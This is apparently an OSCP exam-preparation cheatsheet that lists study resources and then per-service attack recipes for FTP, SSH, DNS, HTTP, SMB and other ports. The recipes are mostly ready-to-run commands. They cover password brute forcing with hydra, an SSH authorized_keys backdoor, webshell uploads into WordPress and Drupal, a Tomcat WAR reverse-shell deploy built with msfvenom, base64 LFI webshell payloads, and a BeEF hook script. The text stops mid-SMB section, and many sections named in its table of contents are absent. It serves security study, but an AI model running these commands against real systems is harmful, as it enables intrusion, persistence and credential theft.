# OSCP_CHEATSHEET

# TABLE OF CONTENTS
- [OSCP_CHEATSHEET](#oscp_cheatsheet)
- [TABLE OF CONTENTS](#table-of-contents)
  - [OSCP SubReddit](#oscp-subreddit)
  - [OSCP Guides](#oscp-guides)
  - [Pimping your Kali](#pimping-your-kali)
  - [Terminal Resources](#terminal-resources)
  - [Note Taking Tools](#note-taking-tools)
  - [Report Writing](#report-writing)
  - [Advice](#advice)
  - [Hacking Labs](#hacking-labs)
  - [General Resources](#general-resources)
    - [OSCP Useful Info](#oscp-useful-info)
    - [OSCP Courses](#oscp-courses)
    - [Video Guides On Hacking Labs](#video-guides-on-hacking-labs)
    - [OSCP CheatSheets](#oscp-cheatsheets)
    - [OSCP Report Resources](#oscp-report-resources)
    - [Other Resources](#other-resources)
  - [Windows Resources](#windows-resources)
  - [Linux Resources](#linux-resources)
  - [Buffer Overflow Resources](#buffer-overflow-resources)
  - [Useful Tools for OSCP](#useful-tools-for-oscp)
  - [Enumeration](#enumeration)
    - [On-Screen Enumeration (IPs Unknown)](#on-screen-enumeration-ips-unknown)
    - [Automated Scans (IPs Known)](#automated-scans-ips-known)
    - [On-Screen Enumeration (IPs Known)](#on-screen-enumeration-ips-known)
    - [Saved Scans (IPs Known)](#saved-scans-ips-known)
    - [Others](#others)
  - [Directory Busting](#directory-busting)
  - [FTP - 21](#ftp---21)
  - [SSH - 22](#ssh---22)
  - [DNS - 53](#dns---53)
  - [FINGER - 79](#finger---79)
  - [HTTP - HTTPS - 80 - 443](#http---https---80---443)
  - [KERBEROS - 88](#kerberos---88)
  - [POP3 - 110](#pop3---110)
  - [SNMP - 161](#snmp---161)
  - [LDAP - 389](#ldap---389)
  - [SMB - 445](#smb---445)
  - [MSSQL - 1433](#mssql---1433)
  - [NFS - 2049](#nfs---2049)
  - [MYSQL - 3306](#mysql---3306)
  - [RDP - 3389](#rdp---3389)
  - [VNC - 5800 - 58001 - 5900 - 5901](#vnc---5800---58001---5900---5901)
  - [WINRM - 5985 - 5986](#winrm---5985---5986)
  - [CGI](#cgi)
  - [DICTIONARY GENERATION](#dictionary-generation)
  - [FILE TRANSFER](#file-transfer)
  - [GIT](#git)
  - [HASHES](#hashes)
  - [MIMIKATZ](#mimikatz)
  - [MSFVENOM PAYLOAD](#msfvenom-payload)
  - [Multihandler Listener](#multihandler-listener)
  - [PASSWORD CRACKING](#password-cracking)
  - [PIVOTING](#pivoting)
  - [LINUX PRIVILEGE ESCALATION](#linux-privilege-escalation)
    - [Linux PrivEsc Courses](#linux-privesc-courses)
    - [PrivEsc Cheatsheets/Scripts](#privesc-cheatsheetsscripts)
      - [Attacks](#attacks)
      - [Vulnerability scan](#vulnerability-scan)
      - [Suid checker](#suid-checker)
      - [Methodology to follow](#methodology-to-follow)
    - [Linux Priv Esc troubleshooting](#linux-priv-esc-troubleshooting)
    - [Linux Troubleshooting](#linux-troubleshooting)
  - [WINDOWS PRIVILEGE ESCALATION](#windows-privilege-escalation)
    - [WINDOWS PrivEsc Courses](#windows-privesc-courses)
    - [PrivEsc Resources](#privesc-resources)
      - [Attacks](#attacks-1)
      - [Enumeration scripts](#enumeration-scripts)
      - [Search for CVE](#search-for-cve)
      - [Post exploitation](#post-exploitation)
        - [Autorun](#autorun)
        - [winPEAS.exe](#winpeasexe)
        - [AlwaysInstallElevated](#alwaysinstallelevated)
        - [Executable Files](#executable-files)
        - [Startup applications](#startup-applications)
        - [Weak service permission](#weak-service-permission)
        - [Unquoted service paths](#unquoted-service-paths)
        - [CVE](#cve)
    - [Windows Troublshooting](#windows-troublshooting)
  - [PROOFS](#proofs)
  - [REVERSE SHELL](#reverse-shell)
  - [SHELLSHOCK](#shellshock)
  - [Buffer Overflow](#buffer-overflow)
  - [USEFUL LINUX COMMANDS](#useful-linux-commands)
  - [USEFUL WINDOWS COMMANDS](#useful-windows-commands)
  - [ZIP](#zip)
  - [MISCELLANEOUS](#miscellaneous)

## OSCP SubReddit
- [OSCP Reddit!](https://www.reddit.com/r/oscp)

## OSCP Guides 
- [Awesome OSCP GitHub](https://github.com/0x4D31/awesome-oscp)
- [The Journey to Try Harder: TJnull’s Preparation Guide for PWK/OSCP](https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html)
- [An Adventure to Try Harder: Tjnull's OSCP Journey](https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html)
- [he Ultimate OSCP Preparation Guide, 2021 - johnjhacking](https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/)
- [How to prepare for PWK/OSCP, a noob-friendly guide](https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob)
- [How To Pass the OSCP – a Beginner Friendly Guide](https://kentosec.com/2019/10/09/how-to-pass-the-oscp-a-beginner-friendly-guide/)
- [Hakluke’s Ultimate OSCP Guide: Part 1 — Is OSCP for you? Some things you should know before you start](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-1-is-oscp-for-you-b57cbcce7440)
- [Hakluke’s Ultimate OSCP Guide: Part 2 — Workflow and documentation tips](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-2-workflow-and-documentation-tips-9dd335204a48)
- [Hakluke’s Ultimate OSCP Guide: Part 3 — Practical hacking tips and tricks](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97)
- [Reddit - OSCP Lab & Exam Review and Tips](https://www.reddit.com/r/oscp/comments/ix81m8/oscp_lab_exam_review_and_tips/)
- [Reddit - Passed - 1st Attempt. Thoughts, Tips, Facts](https://www.reddit.com/r/oscp/comments/j4jp6w/passed_1st_attempt_thoughts_tips_facts/)
- [OSCP Preparation 2021 — Learning Path](https://ltsirkov.medium.com/oscp-preparation-2021-learning-path-41a88eb1a4b)
- [More Lessons Learned About Trying Harder and Passing the Offensive Security Certified Professional Exam (OSCP)](https://www.tripwire.com/state-of-security/security-data-protection/passing-offensive-security-certified-professional-exam-oscp/)
- [The Penultimate Guide to Defeat the OSCP](https://www.linkedin.com/pulse/penultimate-guide-defeat-oscp-corey-ball-oscp-cissp-cism/)
- [A BEGINNERS GUIDE TO OSCP 2021](https://hxrrvs.medium.com/a-beginners-guide-to-oscp-2021-adb234be1ba0)
- [59 Hosts to Glory — Passing the OSCP](https://medium.com/@Tib3rius/59-hosts-to-glory-passing-the-oscp-acf0fd384371)

## Pimping your Kali
  - [OSCP Kali Setup](https://github.com/cameronww7/Kali-Setup)
  - [Terminal Setup Script](https://github.com/cameronww7/Kali-Setup)
  - [Pimp My Kali](https://github.com/Dewalt-arch/pimpmykali)
  - [HotWax](https://github.com/BrashEndeavours/hotwax)


## Terminal Resources
- [How to use Tumx - IppSec](https://www.youtube.com/watch?v=Lqehvpe_djs)
- [Basic tmux Tutorial](https://www.youtube.com/watch?v=BHhA_ZKjyxo)
- [Tmux CheatSheet](https://tmuxcheatsheet.com/)
- [tmux Wiki](https://github.com/tmux/tmux/wiki)
- [My Custom Terminal Settings](https://github.com/cameronww7/Terminal-Customization)

## Note Taking Tools
- [CherryTree](https://www.giuspen.com/cherrytree/)
- [Screenshots](https://getgreenshot.org/)


## Report Writing
- [OffSec Offical Test Report](https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf)
- [OffSec Linux Report Writing](https://help.offensive-security.com/hc/en-us/articles/360046787731-Penetration-Testing-with-Kali-Linux-Reporting)
- [OSCP - How to Write the Report](https://www.youtube.com/watch?v=Ohm0LhFFwVA)
- [OSCP Report Made Easy](https://www.youtube.com/watch?v=O9JWmF3Bgis)

## Advice 
- [OSCP - Advice For The Exam](https://www.youtube.com/watch?v=nzAMZvEC_Xc&feature=youtu.be)


## Hacking Labs
  - [HackTheBox - $20/M](https://app.hackthebox.eu/home)
  - [TryHackMe - $10/M](https://tryhackme.com/login)
  - [VulnHub - $Free](https://www.vulnhub.com/)
  - [Proving Grounds - $20/M](https://www.offensive-security.com/labs/individual/)
  - [Virtual Hacking Labs - $99/M](https://www.virtualhackinglabs.com/)

## General Resources
### OSCP Useful Info
- [Unofficial Approved Tools List](https://falconspy.medium.com/unofficial-oscp-approved-tools-b2b4e889e707)
- [OSCP Official Kali VM](https://help.offensive-security.com/hc/en-us/articles/360046292812-Penetration-Testing-with-Kali-Linux-Virtual-Machine)
- [OffSec PWK-Lab-Connectivity-Guide](https://help.offensive-security.com/hc/en-us/articles/360046733931-Offensive-Security-PWK-Lab-Connectivity-Guide)

### OSCP Courses
- [Ethical Hacking - The Cyber Mentor/TCM](https://www.udemy.com/course/practical-ethical-hacking/)
- [Windows Privilege Escalation for OSCP & Beyond! - Tib3rius](https://www.udemy.com/course\windows-privilege-escalation/)
- [Windows Privilege Escalation for Beginners - The Cyber Mentor/TCM](https://www.udemy.com/course/windows-privilege-escalation-for-beginners/)
- [Linux Privilege Escalation for OSCP & Beyond! - Tib3rius](https://www.udemy.com/course/linux-privilege-escalation/)
- [Linux Privilege Escalation for Beginners - The Cyber Mentor/TCM](https://www.udemy.com/course/linux-privilege-escalation-for-beginners/)

### Video Guides On Hacking Labs
- HTB (HackTheBox)
  - [Ippsec Youtube](https://www.youtube.com/c/ippsec)
  - [Ippsec Youtube Playlists](https://www.youtube.com/c/ippsec/playlists)
  - [Ignitetechnologies - HackTheBox-CTF-Writeups](https://github.com/Ignitetechnologies/HackTheBox-CTF-Writeups)
  - [HTB Writeups - Purp1eW0lf](https://github.com/Purp1eW0lf/HackTheBoxWriteups)
  - [HTB Writeups - ranakhalil101](https://medium.com/@ranakhalil101/hack-the-box-jarvis-writeup-w-o-metasploit-9f4cc7907c87)

- VulnHub
  - [Ignitetechnologies - Linux Priv Esc](https://github.com/Ignitetechnologies/Privilege-Escalation)

- THM (TryHackMe)

### OSCP CheatSheets
- [Oscp-Cheat-Sheet Megga - avi7611](https://github.com/avi7611/Oscp-Cheat-Sheet)
- [liodeus OSCP-personal-cheatsheet](https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html#enumeration)
- [sushant747 total-oscp-guide](https://sushant747.gitbooks.io/total-oscp-guide/content/)
- [TCM Prac Eth Hack Resources](https://github.com/TCM-Course-Resources/Practical-Ethical-Hacking-Resources)
- [Buffer Overflow personal cheatsheet](https://liodeus.github.io/2020/08/11/bufferOverflow.html)
- [scund00r - Passing OSCP](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html)
- [noobsec - oscp-cheatsheet](https://www.noobsec.net/oscp-cheatsheet/)
- [bytefellow - oscp-ultimate-cheatsheet](https://www.bytefellow.com/oscp-ultimate-cheatsheet/)

### OSCP Report Resources
- [liodeus OSCP-exam-report-training](https://liodeus.github.io/2020/10/19/OSCP-exam-report-training.html)
- [OSCP-Exam-Report-Template](https://github.com/whoisflynn/OSCP-Exam-Report-Template)
- [OSCP-Exam-Report-Template-Markdown](https://github.com/noraj/OSCP-Exam-Report-Template-Markdown)

### Other Resources
- [Some Tutorials and Things to Do while Hunting Particular Vulnerability](https://github.com/KathanP19/HowToHunt)


## Windows Resources
- [Path Traversals OWASP](https://owasp.org/www-community/attacks/Path_Traversal)
- [Win File Perms](https://superuser.com/questions/364083/windows-list-files-and-their-permissions-access-in-command-line)

- VulnHub
- [Ignitetechnologies - Linux Priv Esc](https://github.com/Ignitetechnologies/Privilege-Escalation)

- Other
- [Path Traversal](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/)

## Linux Resources
- [Linux Terminal Cheatsheet](https://dev.to/mauro_codes/linux-terminal-the-ultimate-cheat-sheet-2g5b)
- [Path Traversal](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/)
- [Path Traversals OWASP](https://owasp.org/www-community/attacks/Path_Traversal)
- [Linux File Perms](https://www.pluralsight.com/blog/it-ops/linux-file-permissions)
- [Restricted Linux Shell Escaping Techniques](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [Spawning a TTY Shell](https://netsec.ws/?p=337)

- Other

## Buffer Overflow Resources
- [Buffer Overflows Made Easy - The Cyber Mentor](https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G)
- [TCM Buffer over Flows Made Easy](https://tcm-sec.com/buffer-overflows-made-easy/)
- [Buffer Overflow personal cheatsheet](https://liodeus.github.io/2020/08/11/bufferOverflow.html)
- [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)


## Useful Tools for OSCP
- [Approved Tools List](https://falconspy.medium.com/unofficial-oscp-approved-tools-b2b4e889e707)
- [Random List of Hackin-Tools](https://github.com/lorenzoinvidia/Hackin-tools)
- Tools To Know
  - [Autorecon](https://github.com/Tib3rius/AutoRecon)
  - [nmapAutomator](https://github.com/21y4d/nmapAutomator)
  - [nikto](https://tools.kali.org/information-gathering/nikto)
  - [nmap](https://nmap.org/)
  - [gobuster](https://github.com/OJ/gobuster)
  - [ncat](https://nmap.org/ncat/)
  - [burp suite](https://portswigger.net/burp)
  - [hydra](https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/)
  - [enum4linux](https://labs.portcullis.co.uk/tools/enum4linux/)
  - [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
  - [snmpwalk](https://linux.die.net/man/1/snmpwalk)
  - [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
  - [dotdotpwn](https://www.cyberpunk.rs/dotdotpwn-the-directory-traversal-fuzzer#:~:text=DotDotPwn%20is%20an%20intelligent%20fuzzing,TFTP%2C%20HTTP%2C%20and%20FTP.)
  - [searchsploit](https://www.exploit-db.com/searchsploit)
  - [ftp](https://tldp.org/HOWTO/FTP-3.html)
  - [smtp](https://www.gmass.co/blog/smtp/)
  - [SSH](https://www.digitalocean.com/community/tutorials/ssh-essentials-working-with-ssh-servers-clients-and-keys)
  - [linenum.sh](https://github.com/rebootuser/LinEnum)
  - [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
  - [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
  - [sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
  - [Impacket](https://github.com/SecureAuthCorp/impacket)
    - [Impacket Tool Description](https://www.secureauth.com/labs/open-source-tools/impacket/)
  - [FinalRecon - automatic web reconnaissance](https://github.com/thewhiteh4t/FinalRecon)


## Enumeration
### On-Screen Enumeration (IPs Unknown)
- `nmap -sn -v -oN NMAP-UnknownIPs_01.txt <IP>/CIDR`
- `autorecon <IP>/CIDR`
- `netdiscover -r <>/CIDR`

### Automated Scans (IPs Known)
- `sudo autorecon <IP>`
- `sudo nmapAutomator.sh --host <IP> --type All`

### On-Screen Enumeration (IPs Known)
- Quick Scan
  - `sudo nmap -T4 -A -v <IP>`
- Full Scan
  - `sudo nmap -T3 -A -p- -v <IP>`
- Vulners  (Website only)
  - `sudo nmap -sV -v --script=vulners <IP>`

### Saved Scans (IPs Known)
- Quick Scan
  - `sudo nmap -T4 -A -v -oN NMAP--QUICK--SCAN_<IP>_01.txt <IP>`
- Full Scan
  - `sudo nmap -T3 -A -p- -v -oN NMAP--FULL--SCAN_<IP>_01.txt <IP>`
- [Vulner Scan (Website only)](https://github.com/vulnersCom/nmap-vulners)
  - `sudo nmap -sV -v --script=vulners -oN NMAP--VULNERS_01_<IP>_01.txt <IP>`
- UDP Scan
  - `sudo nmap -T3 -sU -A -p- -v -oN NMAP-MFS_<IP>_01.txt <IP>`

- Faster NMAP full port scan (IPs Known)
- Finds all open ports than loops through service and version detection for those discovered
  - `ports=$(nmap -p- --min-rate=1000 -sT  -T4 <IP> | grep ^[0-9] | cut-d '/' -f 1 | tr '\n' ',' | sed s/,$//)nmap -sC -sV -p$ports -sT <IP>`

### Others
- `sudo nikto -Display 1234EP -o -Tuning 123bde NIKTO_SCAN.txt -host <IP/URL>`


## Directory Busting
- Dirbuster
  - [Dirbuster Description](https://tools.kali.org/web-applications/dirbuster)

- GoBuster
  - Resources
    - [materials.rangeforce tutorial](https://materials.rangeforce.com/tutorial/2020/03/26/Gobuster/)
    - [redteamtutorials tutorial](https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/)
  - Examples
    - `gobuster dir -u <IP or URL> -t 200 -w <Path to dir path file>`
      - Example 1: `gobuster dir -u http://10.129.1.135/nibbleblog/ -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt >> goBuster-01.txt` 
      - Example 2: `gobuster dir -u http://10.129.1.135:80 -t 200 -w /usr/share/wordlists/dirb/common.txt >> goBuster-01.txt`


## FTP - 21
- Brute force
  - `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV`

- Downloading file
  - `ftp <IP>`

- PASSIVE
  - BINARY
    - `get <FILE>`
  - Uploading file
    - `ftp <IP>`
- PASSIVE
  - BINARY
    - `put <FILE>`


## SSH - 22
- Brute force
  - `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV`

- CVE-2008-0166
  - All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.
  - <https://www.exploit-db.com/exploits/5720>

  - `wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2`

  - `bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2`
  - `tar -xvf debian_ssh_rsa_2048_x86.tar`
  - `tar -xvf debian_ssh_dsa_1024_x86.tar`

  - `python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>`
  - `python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>`

- SSH backdoor - post exploitation
  - Attacker
    - `ssh-keygen -f <FILENAME>`
    - `chmod 600 <FILENAME>`
    - `cat <FILENAME>.pub -> copy`

  - Victim
    - `echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys`

  - Connect
    - `ssh -i <FILENAME> <USER>@<IP>`


## DNS - 53
- `dnsenum <DOMAIN>`
- `dnsrecon -d <DOMAIN>`

- Zone Transfers
  - `dnsrecon -d <DOMAIN> -a`
  - `dig axfr <DOMAIN> @ns1.test.com`

- DNS brute force
  - <https://github.com/blark/aiodnsbrute>


## FINGER - 79
- User enumeration
  - `finger @<IP>`
  - `finger <USER>@<IP>`

- Command execution
  - `finger "|/bin/id@<IP>"`
  - `finger "|/bin/ls -a /<IP>"`


## HTTP - HTTPS - 80 - 443
- Automatic scanners
  - `sudo nikto -h <URL>`
  - `sudo python crawleet.py -u <URL> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20`
  - `sudo nmap -sV -v --script=vulners -oN NMAP-VULNERS_01_<IP>_01.txt <IP>`

- Wordpress
  - Scan
    - `wpscan --rua -e --url <URL>`

  - Brute force user(s)
    - `wpscan --rua --url <URL> -P <PASSWORDS_LIST> -U "<USER>,<USER>"`

- Wordpress panel RCE
  - `Modifying a php from the theme used (admin credentials needed)`

  - Appearance -> Editor -> 404 Template (at the right)
  - Change the content for a php shell
  - <https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php>
    - <https://github.com/flozz/p0wny-shell>
  - `http://<IP>/wp-content/themes/twentytwelve/404.php`

- Drupal
  - `droopescan scan -u <URL>`

- Username enumeration
  - In /user/register just try to create a username and if the name is already taken it will be notified : 
    - *The name admin is already taken*
  - If you request a new password for an existing username :
    - *Unable to send e-mail. Contact the site administrator if the problem persists.*
  - If you request a new password for a non-existent username :
    - *Sorry, test is not recognized as a user name or an e-mail address.*
  - Accessing `/user/<number`> you can see the number of existing users :
    - `/user/1` -> Access denied (user exist)
    - `/user/2` -> Page not found (user doesn't exist)

- Hidden pages enumeration
  - `Fuzz /node/<NUMBER> where <NUMBER> is a number` (from 1 to 500 for example).
  - You could find hidden pages (test, dev) which are not referenced by the search engines.

  - `wfuzz -c -z range,1-500 --hc 404 <URL>/node/FUZZ`

- Drupal panel RCE
  - You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)

  - Go to Modules -> (Check) PHP Filter  -> Save configuration

  - <https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php>

  - Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview

- Joomla
  - `joomscan -u <URL>`
  - `./joomlavs.rb --url <URL> -a -v`

- Tomcat
  - Default credentials
    - The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :
      - `admin:admin`
      - `tomcat:tomcat`
      - `admin:<NOTHING>`
      - `admin:s3cr3t`
      - `tomcat:s3cr3t`
      - `admin:tomcat`
  - Brute force
    - `hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u`

- Tomcat panel RCE
  - Generate payload
    - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war`

  - Upload payload
    - Tomcat6 :
      - `wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -`

    - Tomcat7 and above :
      - `curl -v -u <USER>:<PASSWORD> -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shellh&update=true'`

  - Listener
    - `nc -lvp <PORT>`

  - Execute payload
    - `curl http://<IP>:8080/shell/`

- WebDav
  - `davtest -url <URL>`

- HTTP brute force authentication
  - HTTP basic authentication
    - Hydra
      - `hydra -l <USER> -V -P <PASSWORDS_LIST> -s 80 -f <IP> http-get /<URL_ENDPOINT>/ -t 15`
    - Patator
      - `python patator.py http_fuzz auth_type=basic url=<URL> user_pass=FILE0 0=<USER:PASSWORD_LIST> -x ignore:code=401 -x ignore:code=307`

  - HTTP GET request
    - `hydra <IP> -V -l <USER> -P <PASSWORDS_LIST> http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <THREADS_NUMBER>`

  - HTTP POST request
    `hydra -l <USER> -P <PASSWORDS_LIST> <IP> http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t <THREADS_NUMBER>`

- Spidering / Brute force directories / files
  - `gospider -d <DEPTHS> --robots --sitemap -t <THREADS> -s <URL>`

  - `ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <URL>/FUZZ -e .php,.txt -t <THREADS>`
  
  - [dirbuster](https://tools.kali.org/web-applications/dirbuster)
    - `dirbuster`
  
  - [gobuster](https://tools.kali.org/web-applications/gobuster)
    - `gobuster -h`

  - Dictionaries :
    - /usr/share/wordlists/dirb/common.txt
    - /usr/share/wordlists/dirb/big.txt
    - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

- File backups
  - Once you have found all the files, look for backups of all the executable files (“.php”, “.aspx“…). Common variations for naming a backup are
  - `file.ext~`, `file.ext.bak`, `file.ext.tmp`, `file.ext.old`, `file.bak`, `file.tmp` and `file.old`

- Local File Inclusion / Remote File Inclusion - LFI / RFI
  - <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion>
  - <https://highon.coffee/blog/lfi-cheat-sheet/>
  - <https://nets.ec/Coldfusion_hacking#Remote_File_Disclosure_of_Password_Hashes>

  - Wrappers
    - Wrapper php://filter
      - <http://example.com/index.php?page=php://filter/convert.base64-encode/resource=>
    - Wrapper expect://
      - <http://example.com/index.php?page=expect://id>
    - Wrapper data://
      - `echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=`

    - <http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=>

    - If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.

    - Code execution with
      - exec
      - shell_exec
      - system
      - passthru
      - popen

    - Example:
      - `echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=`
      - <http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=>

      - If there is "Shell done !" on the webpage, then there is code execution and you can do things like :
      - <http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls>

    - Wrapper input://
      - `curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"`

  - Useful LFI list
    - Linux
      - `/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`
    - Windows
      - `/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt`
    - Both
      - `/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt`

  - Tools
    - `kadimus --url <URL>`
    - `python lfisuite.py`

- Command injection
  - For command injection always use BurpSuite !
    - [Command Injection swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

- Deserialization
  - [Insecure Deserialization - swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
  - [.NET - YSoSerial.Net](https://github.com/pwntester/ysoserial.net)

- File upload
  - [Upload InsecureFiles - swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

- SQL injection
  - [mssql-sql-injection-cheat-sheet - pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
  - [sql-injection-authentication-bypass-cheat-sheet - pentestlab](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
  - [SQL Injection - swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
  - [a-pentesters-guide-to-sql-injection-sqli](https://blog.cobalt.io/a-pentesters-guide-to-sql-injection-sqli-16fd570c3532)

- XSS
  - [XSS Injection - swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
  - beef-xss
    - `cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password`
    - `<script src="http://<IP>:3000/hook.js"></script>`
- Other web vulnerabilities
  - [PayloadsAllTheThings - swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings)

- Upload a file with PUT
  - `curl -X PUT http://<IP>/<FILE> -d @<FILE>  -v`


## KERBEROS - 88
- <https://www.tarlogic.com/en/blog/how-to-attack-kerberos/>


## POP3 - 110
- Brute force
  - `hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V`
  - `hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V`

- Read mail
  - `telnet <IP> 110`
  - `USER <USER>`
  - `PASS <PASSWORD>`
  - `LIST`
  - `RETR <MAIL_NUMBER>`
  - `QUIT`


## SNMP - 161
- Brute force community string
  - `onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>`
  - `snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> <IP>`
  - `snmp-check <IP>`
- Modifying SNMP values
  - <http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html>


## LDAP - 389
- Scans
  - `nmap -n -sV --script "ldap* and not brute"`
  - `ldapsearch -h <IP> -x -s base`
  - `ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"`

  - Graphical Interface
    - [jxplorer](http://jxplorer.org/)


## SMB - 445
- Version if nmap didn’t detect it
  - Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.
  - OR
  - `sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139`
  - `smbclient -L <IP>`

- Scan for vulnerability
  - `nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>`

- Manual testing
  - smbmap
    - `smbmap -H <IP>`
    - `smbmap -u '' -p '' -H <IP>`
    - `smbmap -u 'guest' -p '' -H <IP>`
    - `smbmap -u '' -p '' -H <IP> -R`

- crackmapexec
  - `crackmapexec smb <IP>`
  - `crackmapexec smb <IP> -u '' -p ''`
  - `crackmapexec smb <IP> -u 'guest' -p ''`
  - `crackmapexec smb <IP> -u '' -p '' --shares`

- emum4linux
  - `enum4linux -a <IP>`
  
- smbclient
  - `smbclient --no-pass -L //$IP`
  - `smbclient //<IP>/<SHARE>`
  - Download all files from a directory recursively
    - `smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"`

- Brute force
  - `crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>`
  - `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV`
- Mount a SMB share
  - `mkdir /tmp/share`
  - `sudo mount -t cifs //<IP>/<SHARE> /tmp/share`
  - `sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share`

  - `smbclient //<IP>/<SHARE>`
